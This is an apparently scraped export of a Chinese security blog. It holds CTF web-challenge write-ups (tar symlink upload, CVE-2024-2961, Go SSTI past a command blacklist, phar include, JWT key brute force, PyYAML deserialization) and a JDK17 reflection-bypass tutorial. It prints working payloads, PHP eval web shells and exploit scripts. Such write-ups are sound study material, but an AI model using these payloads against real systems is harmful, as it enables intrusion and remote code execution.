constructor.setAccessible(true); return constructor.newInstance(); } } 也是成功打jndi从而弹出计算机：\n————————————\n总结 最有意思的就是了解到了ReflectionFactory类的使用，确实好用，可以直接构造一个java对象不管其构造方法，以后多注意思考利用。 参考文章：\nhttps://zhuanlan.zhihu.com/p/158978955\nhttps://blog.potatowo.top/2024/11/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHibernate/#hibernate2\n","date":"2025-09-19T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"hibernate组件的反序列化漏洞"},{"content":"WEB 文曲签学 开题前端有提示：\n在前端页面的js代码中，可以看到存在一个调试模式：\n长按fn激活：\n然后通过提示输入#help：\n可以看列表并读取文件内容，多次尝试读取，最后双写绕过../再读flag即可：\n1 #read …/./…/./…/./…/./flag flag如下：\n1 flag{18d8f6bc-50ef-4ca2-af72-cdc3e6e76391} EZ_upload EZ_upload?\n————————————\n随便上传一个php文件即可拿到文件源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u0026lt;?php highlight_file(__FILE__); function handleFileUpload($file) { $uploadDirectory = \u0026#39;/tmp/\u0026#39;; if ($file[\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) { echo \u0026#39;文件上传失败。\u0026#39;; return; } $filename = basename($file[\u0026#39;name\u0026#39;]); $filename = preg_replace(\u0026#39;/[^a-zA-Z0-9_\\-\\.]/\u0026#39;, \u0026#39;_\u0026#39;, $filename); if (empty($filename)) { echo \u0026#39;文件名不符合要求。\u0026#39;; return; } $destination = $uploadDirectory . $filename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; tar -xvf \u0026#39; . $filename.\u0026#39;\u0026amp;\u0026amp;pwd\u0026#39;); echo $destination; } else { echo \u0026#39;文件移动失败。\u0026#39;; } } handleFileUpload($_FILES[\u0026#39;file\u0026#39;]); ?\u0026gt; 通读代码，可以看出最重要的代码如下：\n1 2 3 4 5 6 7 $destination = $uploadDirectory . $filename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; tar -xvf \u0026#39; . $filename.\u0026#39;\u0026amp;\u0026amp;pwd\u0026#39;); echo $destination; } else { echo \u0026#39;文件移动失败。\u0026#39;; } 有一个命令执行的操作，最开始我还以为是操控文件名来达到任意命令执行的效果，并且作了waf来进行相应的限制。后面看到exec中执行了tar解压的命令，压缩包，软链接考烂了，自然想到这个打法。\n关于压缩包软链接的打法，非常经典的打法可以参考如下wp：\nhttps://www.cnblogs.com/gxngxngxn/p/17439035.html\n并且代码都是差不多的：\n1 exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; unzip -o \u0026#39; . $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]); 简单来说就是上传两个压缩包，第一个创建一个指向/var/www/html目录下的软链接，第二个就会解压到软链接对应的目录下，如下打即可：\n1 2 3 4 5 6 7 8 9 10 ln -s /var/www/html mylink tar -cvhf archive.tar mylink rm -rf ./* mkdir mylink cd mylink vim shell.php (\u0026lt;?php @eval($_POST[123]);?\u0026gt;) cd .. tar -cvhf archive.tar mylink/shell.php 然后先上传第一次生成的archive.tar，再上传第二次生成的archive.tar文件，然后访问shell.php即可：\nflag如下：\n1 flag{a91443eb-28c4-4eff-8b9a-a6b515b75633} ——————————\nSeRce // 这是一段极其安全的代码 - 来自某个开发者的注释\n\u0026hellip;\n（三分钟后）\n\u0026hellip;\n好吧，看来注释需要更新了。你的任务：让这段代码做一件它‘绝对不该做’的事情——把 /flag 的内容吐出来。祝你好运！\n——————————————\n开题代码如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php highlight_file(__FILE__); $exp = $_GET[\u0026#34;exp\u0026#34;]; if(isset($exp)){ if(serialize(unserialize($exp)) != $exp){ $data = file_get_contents($_POST[\u0026#39;filetoread\u0026#39;]); echo \u0026#34;File Contents: $data\u0026#34;; } } 非常简单的代码，可以看出需要反序列化后再序列化的数据是不同的，然后有一个任意文件读取，第一个waf，想到了字符串逃逸的增多的方法，也就是当正常匹配到完整的反序列化数据，后面的内容就会被舍弃，让ai给出一个序列化字符串，然后加上一些其他数据即可：\n但是直接读flag也读不出来，再看这里的File Contents: 的回显，非常容易想到CVE-2024-2961的打法，也是非常常见的考点了，结合题目描述猜测是需要提权。最开始打的kezibei的本地化项目来写文件，没成功，然后还是改的最开始给出的脚本：\nhttps://github.com/ambionics/cnext-exploits\n写文件还是没成功，后面一想，是不是权限不够，那么我就写回显到/tmp目录下，然后再读这个文件内容：\n修改的关键的python脚本的内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; return self.session.post(self.url, data={\u0026#34;filetoread\u0026#34;: path},params={\u0026#34;exp\u0026#34;:\u0026#39;O:1:\u0026#34;X\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;test\u0026#34;;}111\u0026#39;}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) m = re.search(b\u0026#34;File Contents: (.*)\u0026#34;, response.content, flags=re.S) if m: data = m.group(1) print(data) else: print(\u0026#34;匹配不到\u0026#34;) return base64.decode(data) 然后将其运行脚本：\n1 python3 1.py https://eci-2ze5f0zlgsjhwokxvmcd.cloudeci1.ichunqiu.com:80/ \u0026#34;/readflag \u0026gt; /tmp/2.txt\u0026#34; 可以打成功。在这里我是先ls /看到readflag，那么就是要如上命令执行了，随后可以拿到flag：\nflag如下：\n1 flag{41483f84-343f-4976-b94f-808dd785b475} ——————————————————\n","date":"2025-09-14T17:05:27+08:00","permalink":"https://fupanc-w1n.github.io/p/%E7%AC%AC%E4%BA%94%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/","title":"第五届“长城杯”网络安全大赛WEB题解"},{"content":"WEB 题目质量一般。\nssti 模板注入\n————————\ngo语言的ssti，参考如下的文章直接打就行：\nhttps://xz.aliyun.com/news/15003\n可以进行命令执行：\n可以读到根目录：\n1 2 app boot etc\tgo lib media opt root sbin sys usr bin dev flag home lib64 mnt proc run\tsrv tmp var 有flag，但是后面尝试很多payload都没有成功起作用，合理猜测后端是加了waf的，那么就先读取main.go运行文件：\n1 {{ exec \u0026#34;nl main.go\u0026#34; }} 拿到如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 package main import ( \u0026#34;bytes\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;regexp\u0026#34; \u0026#34;runtime\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;text/template\u0026#34; ) func execCommand(command string) string { var cmd *exec.Cmd if runtime.GOOS == \u0026#34;windows\u0026#34; { cmd = exec.Command(\u0026#34;cmd\u0026#34;, \u0026#34;/c\u0026#34;, command) } else { cmd = exec.Command(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, command) } var out bytes.Buffer var stderr bytes.Buffer cmd.Stdout = \u0026amp;out cmd.Stderr = \u0026amp;stderr err := cmd.Run() if err != nil { if stderr.Len() \u0026gt; 0 { return fmt.Sprintf(\u0026#34;命令执行错误: %s\u0026#34;, stderr.String()) } return fmt.Sprintf(\u0026#34;执行失败: %v\u0026#34;, err) } return out.String() } func b64Decode(encoded string) string { decodedBytes, err := base64.StdEncoding.DecodeString(encoded) if err != nil { return \u0026#34;error\u0026#34; } return string(decodedBytes) } func aWAF(next http.Handler) http.Handler { return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \u0026#34;/api\u0026#34; { next.ServeHTTP(w, r) return } query := r.URL.Query().Get(\u0026#34;template\u0026#34;) if query == \u0026#34;\u0026#34; { next.ServeHTTP(w, r) return } blacklist := []string{ \u0026#34;ls\u0026#34;, \u0026#34;whoami\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;uname\u0026#34;, \u0026#34;nc\u0026#34;, \u0026#34;flag\u0026#34;, \u0026#34;etc\u0026#34;, \u0026#34;passwd\u0026#34;, \u0026#34;\\\\*\u0026#34;, \u0026#34;pwd\u0026#34;, \u0026#34;rm\u0026#34;, \u0026#34;cp\u0026#34;, \u0026#34;mv\u0026#34;, \u0026#34;chmod\u0026#34;, \u0026#34;chown\u0026#34;, \u0026#34;wget\u0026#34;, \u0026#34;curl\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;python\u0026#34;, \u0026#34;perl\u0026#34;, \u0026#34;ruby\u0026#34;, \u0026#34;system\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;less\u0026#34;, \u0026#34;more\u0026#34;, \u0026#34;find\u0026#34;, \u0026#34;grep\u0026#34;, \u0026#34;awk\u0026#34;, \u0026#34;sed\u0026#34;, \u0026#34;tar\u0026#34;, \u0026#34;zip\u0026#34;, \u0026#34;unzip\u0026#34;, \u0026#34;gzip\u0026#34;, \u0026#34;gunzip\u0026#34;, \u0026#34;bzip2\u0026#34;, \u0026#34;bunzip2\u0026#34;, \u0026#34;xz\u0026#34;, \u0026#34;unxz\u0026#34;, \u0026#34;docker\u0026#34;, \u0026#34;kubectl\u0026#34;, \u0026#34;git\u0026#34;, \u0026#34;svn\u0026#34;, \u0026#34;f\u0026#34;, \u0026#34;l\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;\\\\?\u0026#34;, \u0026#34;\u0026amp;\u0026amp;\u0026#34;, \u0026#34;\\\\|\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026lt;\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;\\\\(\u0026#34;, \u0026#34;\\\\)\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;\\\\\\\\\u0026#34;, \u0026#34;\\\\^\u0026#34;, \u0026#34;\\\\$\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, } escaped := make([]string, len(blacklist)) for i, item := range blacklist { escaped[i] = \u0026#34;\\\\b\u0026#34; + item + \u0026#34;\\\\b\u0026#34; } wafRegex := regexp.MustCompile(fmt.Sprintf(\u0026#34;(?i)%s\u0026#34;, strings.Join(escaped, \u0026#34;|\u0026#34;))) if wafRegex.MatchString(query) { http.Error(w, query, 200) return } next.ServeHTTP(w, r) }) } func apiHandler(w http.ResponseWriter, r *http.Request) { query := r.URL.Query().Get(\u0026#34;template\u0026#34;) if query == \u0026#34;\u0026#34; { http.Error(w, \u0026#34;需要template参数\u0026#34;, http.StatusBadRequest) return } funcMap := template.FuncMap{ \u0026#34;exec\u0026#34;: execCommand, \u0026#34;B64Decode\u0026#34;: b64Decode, } tmpl, err := template.New(\u0026#34;api\u0026#34;).Funcs(funcMap).Parse(query) if err != nil { http.Error(w, query, http.StatusAccepted) return } var buf bytes.Buffer if err := tmpl.Execute(\u0026amp;buf, funcMap); err != nil { http.Error(w, query, http.StatusAccepted) return } w.Write(buf.Bytes()) } func rootHandler(w http.ResponseWriter, r *http.Request) { if r.URL.Path != \u0026#34;/\u0026#34; { http.NotFound(w, r) return } http.ServeFile(w, r, \u0026#34;index.html\u0026#34;) } func main() { mux := http.NewServeMux() mux.HandleFunc(\u0026#34;/\u0026#34;, rootHandler) mux.HandleFunc(\u0026#34;/api\u0026#34;, apiHandler) log.Println(\u0026#34;服务器启动在 :80\u0026#34;) log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, aWAF(mux))) } 拿到黑名单，所以直接如下读取即可：\n1 {{ exec \u0026#34;nl /??a?\u0026#34; }} 即可拿到flag:\nflag如下：\n1 flag{5cAfgGx3Nd4KPr5aXkYTjeu704U9WDAu} easy_readfile 强强强\n——————————\nphp反序列化的题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026lt;?php highlight_file(__FILE__); function waf($data){ if (is_array($data)){ die(\u0026#34;Cannot transfer arrays\u0026#34;); } if (preg_match(\u0026#39;/\u0026lt;\\?|__HALT_COMPILER|get|Coral|Nimbus|Zephyr|Acheron|ctor|payload|php|filter|base64|rot13|read|data/i\u0026#39;, $data)) { die(\u0026#34;You can\u0026#39;t do\u0026#34;); } } class Coral{ public $pivot; public function __set($k, $value) { $k = $this-\u0026gt;pivot-\u0026gt;ctor; echo new $k($value); } } class Nimbus{ public $handle; public $ctor; public function __destruct() { return $this-\u0026gt;handle(); } public function __call($name, $arg){ $arg[1] = $this-\u0026gt;handle-\u0026gt;$name; } } class Zephyr{ public $target; public $payload; public function __get($prop) { $this-\u0026gt;target-\u0026gt;$prop = $this-\u0026gt;payload; } } class Acheron { public $mode; public function __destruct(){ $data = $_POST[0]; if ($this-\u0026gt;mode == \u0026#39;w\u0026#39;) { waf($data); $filename = \u0026#34;/tmp/\u0026#34;.md5(rand()).\u0026#34;.phar\u0026#34;; file_put_contents($filename, $data); echo $filename; } else if ($this-\u0026gt;mode == \u0026#39;r\u0026#39;) { waf($data); $f = include($data); if($f){ echo \u0026#34;It is file\u0026#34;; } else{ echo \u0026#34;You can look at the others\u0026#34;; } } } } if(strlen($_POST[1]) \u0026lt; 52) { $a = unserialize($_POST[1]); } else{ echo \u0026#34;str too long\u0026#34;; } ?\u0026gt; 一看waf禁了很多，再看可以写文件并且强制文件后缀为phar，再看有一个include()文件包含，基本就可以敲定考点是最近发的include的trick，就是如果要包含的文件的文件名包含.phar，那么会自动对这个文件解压一次在进行常规的文件包含操作，操作过程和分析文章网上都有，这里就不多说了。\n所以这里的思路就是生成一个phar文件然后压缩，再在对Acheron类反序列化时设置模式为w来写入文件，然后再设置模式为r来包含写上去的文件。\n最开始没注意到这里echo了文件名，还找了一下链子用原生类来列文件名，链子如下：\n1 2 3 4 5 6 7 8 $a = new Nimbus(); $a-\u0026gt;handle=new Zephyr(); $a-\u0026gt;handle-\u0026gt;target=new Coral(); $a-\u0026gt;handle-\u0026gt;payload=\u0026#34;/tmp/*\u0026#34;; $a-\u0026gt;handle-\u0026gt;target-\u0026gt;pivot=new Nimbus(); $a-\u0026gt;handle-\u0026gt;target-\u0026gt;pivot-\u0026gt;ctor=\u0026#34;GlobIterator\u0026#34;; unserialize(serialize($a)); 后面在搓脚本发现回显了写入的文件名，遂直接放弃了这个想法（但是这样其实上面设置的一些类都没用到），那么就是直接打了，过程如下：\n生成phar文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $phar = new Phar(\u0026#39;f.phar\u0026#39;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub( \u0026#34; \u0026lt;?php system(\u0026#39;echo \\\u0026#39;\u0026lt;?php eval(\\$_POST[123]);?\u0026gt;\\\u0026#39; \u0026gt; 1.php\u0026#39;); __HALT_COMPILER(); ?\u0026gt; \u0026#34; ); $phar-\u0026gt;addFromString(\u0026#39;f\u0026#39;, \u0026#39;1\u0026#39;); $phar-\u0026gt;stopBuffering(); ?\u0026gt; 然后将生成的f.phar文件压缩再进行后续利用，最开始我是直接命令执行的，但是发现需要提权：\n故直接写马方便些，然后压缩：\n1 gzip -c f.phar \u0026gt; f.phar.gz 然后用一个脚本来上传数据方便写入文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import requests # PHP 接口 URL url = \u0026#34;http://web-1b469e626a.challenge.xctf.org.cn/\u0026#34; # 本地要读取的文件 local_file_path = \u0026#34;f.phar.gz\u0026#34; # 读取本地文件内容 with open(local_file_path, \u0026#34;rb\u0026#34;) as f: file_data = f.read() print(file_data) # POST 数据，PHP 接收 $_POST[0] post_data = {0: file_data,1:\u0026#39;O:7:\u0026#34;Acheron\u0026#34;:1:{s:4:\u0026#34;mode\u0026#34;;s:1:\u0026#34;w\u0026#34;;}\u0026#39;} # 发送 POST 请求 response = requests.post(url, data=post_data) # 输出 PHP 返回的文件路径 print(\u0026#34;PHP 写入的文件路径:\u0026#34;, response.text) 然后拿到文件名去再去文件包含触发：\n现在就去访问1.php进行命令执行即可，这里直接连蚁剑，根目录情况如下：\nflag需要root权限，然后读一下run.sh文件：\n今年年初打的n1junior的backup题，考点是cp通配符提权，就是cp命令的-L选项会保留软链接(always follow symbolic links in SOURCE)，而且/var/www/html下也有backup目录，所以直接如下打即可：\n即可拿到flag:\n1 flag{EP1cyS4CHOVJekHsnCZ7m7HeZpEMLFAu} ————————————\nez_python 冲冲冲\n————————————\n开局可以尝试往后端提交代码并制定模式；\n也就是这里的taml以及python，但是似乎都是只能以admin用户才能使用。\n查看前端代码，有一些非常重要的信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 \u0026lt;script\u0026gt; let token = \u0026#34;\u0026#34;; fetch(\u0026#34;/auth\u0026#34;) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; { token = data.token; const payload = JSON.parse(atob(token.split(\u0026#39;.\u0026#39;)[1])); document.getElementById(\u0026#34;user-info\u0026#34;).innerHTML = \u0026#34;\u0026lt;span style=\u0026#39;color:#444\u0026#39;\u0026gt;👤 \u0026#34; + payload.username + \u0026#34;\u0026lt;/span\u0026gt; | \u0026#34; + \u0026#34;\u0026lt;span style=\u0026#39;color:#4CAF50\u0026#39;\u0026gt;Role: \u0026#34; + payload.role + \u0026#34;\u0026lt;/span\u0026gt;\u0026#34;; }); function runCode() { const fileInput = document.getElementById(\u0026#39;codefile\u0026#39;); const mode = document.getElementById(\u0026#34;mode\u0026#34;).value; if (fileInput.files.length === 0) { document.getElementById(\u0026#34;result\u0026#34;).textContent = \u0026#39;{\u0026#34;error\u0026#34;: \u0026#34;Please select a file to upload.\u0026#34;}\u0026#39;; return; } const file = fileInput.files[0]; const formData = new FormData(); formData.append(\u0026#39;codefile\u0026#39;, file); formData.append(\u0026#39;mode\u0026#39;, mode); fetch(\u0026#34;/sandbox\u0026#34;, { method: \u0026#34;POST\u0026#34;, headers: { \u0026#34;Authorization\u0026#34;: \u0026#34;Bearer \u0026#34; + token }, body: formData }) .then(res =\u0026gt; res.json()) .then(data =\u0026gt; { document.getElementById(\u0026#34;result\u0026#34;).textContent = JSON.stringify(data, null, 2); }); } \u0026lt;/script\u0026gt; 第一个就是在页面初始阶段就会fetch一下auth来获取token，然后在后续的调用中都会带上Authorization来进行身份识别，基本就可以猜测是需要知道伪造jwt了，那么随便上传一个文件来从请求包获取到token：\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E 解码可以得到如下信息：\n对称密钥，然后将payload中的参数修改为admin，那么直接使用jwt伪造的方法，先是尝试过直接爆破弱密钥，没成功，那么可以尝试打一下将算法修改为none：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import jwt header = { \u0026#34;alg\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;typ\u0026#34;: \u0026#34;JWT\u0026#34; } content = { \u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } token = jwt.encode( content, \u0026#34;\u0026#34;, # 密钥，此处置为空 algorithm=\u0026#34;none\u0026#34;, # 加密方式 headers=header ) print(token) 将生成的token拿去传参，回显如下：\n1 {\u0026#34;error\u0026#34;:\u0026#34;JWT Decode Failed. Key Hint\u0026#34;,\u0026#34;hint\u0026#34;:\u0026#34;Key starts with \\\u0026#34;@o70xO$0%#qR9#**\\\u0026#34;. The 2 missing chars are alphanumeric (letters and numbers).\u0026#34;} jwt解码失败，给了一个hint，也就是部分密钥以及说明了后两位是字母和数字，那么用一个python脚本来进行爆破：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/usr/bin/env python3 import itertools import string import jwt # === 固定配置 === TOKEN = \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.karYCKLm5IhtINWMSZkSe1nYvrhyg5TgsrEm7VR1D0E\u0026#34; PREFIX = \u0026#34;@o70xO$0%#qR9#\u0026#34; ALG = \u0026#34;HS256\u0026#34; CHARSET = string.ascii_letters + string.digits # a-zA-Z0-9 def brute_force(): for c1, c2 in itertools.product(CHARSET, repeat=2): key = PREFIX + c1 + c2 try: payload = jwt.decode(TOKEN, key, algorithms=[ALG]) print(\u0026#34;[+] 找到密钥:\u0026#34;, key) print(\u0026#34;[+] payload:\u0026#34;, payload) return except jwt.InvalidTokenError: continue print(\u0026#34;[-] 没有找到匹配的密钥\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: brute_force() 然后就成功爆破出密钥：\n1 2 [+] 找到密钥: @o70xO$0%#qR9#m0 [+] payload: {\u0026#39;username\u0026#39;: \u0026#39;guest\u0026#39;, \u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;} 再使用生成对应的token即可：\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.-Ws9e4GwaL0hesqjmSuOKNmyximBStder-7VnXK0w70 随后就可以进行利用了： 现在再看可以在哪里进行利用，yaml，很容易想到pyyaml反序列化漏洞，在网上找一个payload然后改成有回显的即可：\n1 2 3 4 !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f1111ag\u0026#39;).read()\u0026#34;] 即可拿到flag：\nflag如下：\n1 flag{D5qHNyothAJjypNotQhKybuOaMwkkwjb} 所以这里的考点就是一个jwt伪造+pyyaml反序列化，还没有任何限制。\n","date":"2025-09-09T09:03:52+08:00","permalink":"https://fupanc-w1n.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFweb%E5%85%A8%E8%A7%A3/","title":"2025湾区杯web全解"},{"content":"JDK17下的反射绕过 在前面链子的学习中，可以发现很多链子的使用都需要用到反射，包括最经典的动态加载字节码，我们都是通过反射来进行的类变量的设置。但是随着JDK版本的更替，在jdk17版本后，真正意义上对反射进行了限制。\n下面从几个方面来了解JDK17下的限制以及如何进行绕过。\n记得改jdk配置，还是参考如下文章即可：\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\n下面这个地方容易忘：\n——————————\n前情提要 模块化机制简单了解 从JDK9开始,就不得不提到一个新的机制：模块化系统。\n这个模块化系统是什么呢？随着Java的发展，要使用的代码逐渐增多，添加的自定义库或第三方依赖越来越多，可能造成包访问冲突以及兼容性问题，所以在JDK9过后，提出了一个模块化系统来改善这个情况。可以将一些的代码封装成一个a模块并实现一些功能，并通过当前模块中的module-info.java文件中的定义，使得可以直接定义到一些a模块需要调用的b模块的类的位置，以防出现ClassNotFoundException的异常。\n在当前模块内部的类的调用是没有限制的，但是不同模块中的调用是有限制的，比如a模块只能调用b模块的export的类，简单的例子如下：\n1 2 3 4 5 module com.example.modulea { requires com.example.moduleb; // 依赖于模块moduleb exports com.example.modulea.publicpackage; // 对外公开的包 } //module-info.java 由于模块化机制让一部分类并没有被公开，所以影响到了反射的利用。\njdk17新特性-强封装 反射利用，从jdk9到jdk16都没有禁止，只是提出警告，直到jdk17的新特性才禁止，也就是强封装。\n在官方文档中的说法：一些工具和库使用反射来访问JDK中仅供内部使用的部分。这种反射的使用会对JDK的安全性和可维护性产生负面影响。为了帮助迁移，JDK 9到JDK 16允许这种反射继续进行，但是会发出关于非法反射访问的警告。但是，JDK 17是强封装的，因此默认情况下不再允许此反射。访问java.*的非公共字段和方法的代码会报错InaccessibleObjectException。\n但是sun.misc and sun.reflect 下的包还是可以使用反射的。\n在这里就是要利用到.sun.misc.UnSafe类来进行绕过利用。\n实例说明 JDK8 这里利用defineClass()方法来进行调用加载，具体代码就不说了，就是一个获取到相关class文件的base64编码内容的方法调用：\n然后反射调用defineClass()方法来加载，我这里是直接使用javassist来加载一个类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import javassist.*; import java.lang.reflect.Method; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); CtConstructor constructor = new CtConstructor(new CtClass[]{}, cc); constructor.setBody(\u0026#34;{ try {\\n\u0026#34; + \u0026#34; Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\\n\u0026#34; + \u0026#34; } catch (Exception e) {\\n\u0026#34; + \u0026#34; System.exit(0);\\n\u0026#34; + \u0026#34; } }\u0026#34;); cc.addConstructor(constructor); byte[] classBytes = cc.toBytecode(); Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); method.setAccessible(true); Class clazz = (Class)method.invoke(ClassLoader.getSystemClassLoader(), \u0026#34;Evil\u0026#34;, classBytes, 0, classBytes.length); clazz.newInstance(); } } 运行后成功弹出计算机，无任何错误。\nJDK11 还是之前的代码，运行后同样可以弹出计算机，但是会在控制台输出警告的内容：\n1 2 3 4 5 WARNING: An illegal reflective access operation has occurred WARNING: Illegal reflective access by org.example.Main (file:/java_learn/maven_text/target/test-classes/) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) WARNING: Please consider reporting this to the maintainers of org.example.Main WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations WARNING: All illegal access operations will be denied in a future release Jdk17 直接报错如下：\n1 2 3 4 5 6 Exception in thread \u0026#34;main\u0026#34; java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not \u0026#34;opens java.lang\u0026#34; to unnamed module @673bfdf3 at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354) at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297) at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199) at java.base/java.lang.reflect.Method.setAccessible(Method.java:193) at org.example.Main.main(Main.java:21) 绕过分析 从jdk17的报错来看就是在setAccessible()出了问题，跟进报错提出的方法：\n1 2 3 4 5 public void setAccessible(boolean flag) { AccessibleObject.checkPermission(); if (flag) checkCanSetAccessible(Reflection.getCallerClass()); setAccessible0(flag); } 可以看到这里是通过checkCanSetAccessible()方法来判断对应反射调用的类是否可以直接利用，继续跟进到关键的代码：\n可以看出这里的Reflection.getCallerClass()就是看整个程序发起的caller，也就是这里的Main，而clazz就是反射调用的类的class对象，继续跟进：\n关键的checkCanSetAccessible()全代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 private boolean checkCanSetAccessible(Class\u0026lt;?\u0026gt; caller, Class\u0026lt;?\u0026gt; declaringClass, boolean throwExceptionIfDenied) { if (caller == MethodHandle.class) { throw new IllegalCallerException(); // should not happen } Module callerModule = caller.getModule(); Module declaringModule = declaringClass.getModule(); if (callerModule == declaringModule) return true; if (callerModule == Object.class.getModule()) return true; if (!declaringModule.isNamed()) return true; String pn = declaringClass.getPackageName(); int modifiers; if (this instanceof Executable) { modifiers = ((Executable) this).getModifiers(); } else { modifiers = ((Field) this).getModifiers(); } // class is public and package is exported to caller boolean isClassPublic = Modifier.isPublic(declaringClass.getModifiers()); if (isClassPublic \u0026amp;\u0026amp; declaringModule.isExported(pn, callerModule)) { // member is public if (Modifier.isPublic(modifiers)) { return true; } // member is protected-static if (Modifier.isProtected(modifiers) \u0026amp;\u0026amp; Modifier.isStatic(modifiers) \u0026amp;\u0026amp; isSubclassOf(caller, 